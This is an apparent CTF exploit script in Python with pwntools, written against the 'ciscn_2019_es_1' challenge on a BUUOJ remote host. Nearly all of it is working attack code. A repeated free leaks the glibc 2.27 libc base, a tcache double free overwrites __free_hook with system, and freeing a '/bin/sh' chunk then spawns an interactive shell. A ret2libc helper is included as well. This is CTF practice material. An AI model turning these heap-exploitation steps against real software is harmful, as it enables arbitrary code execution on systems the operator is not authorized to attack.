from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './ciscn_2019_es_1'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',29504) if argv[1]=='r' else process(binary,env={'LD_PRELOAD':'./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')

def dbg():
	gdb.attach(p)
	pause()

# start
def add(size,name):
	sla('choice:','1')
	sla('\n',str(int(size)))
	sa('\n',name)
	sa('\n',name)
def show(index):
	sla('choice:','2')
	sla('\n',str(index))
def free(index):
	sla('choice:','3')
	sla('\n',str(index))

add(0x80,'a') # 0
add(0x80,'/bin/sh\x00') # 1

for i in range(8):
	free(0)
show(0)
ru(':\n')
base = uu64(r(6))-96-libc.sym['__malloc_hook']-0x10
leak('base',base)
free_hook = base + libc.sym['__free_hook']
system = base + libc.sym['system']

add(0x90,'a')
free(2)
free(2)
add(0x90,p64(free_hook))
add(0x90,p64(free_hook))
add(0x90,p64(system))
free(1)
# end

itr()
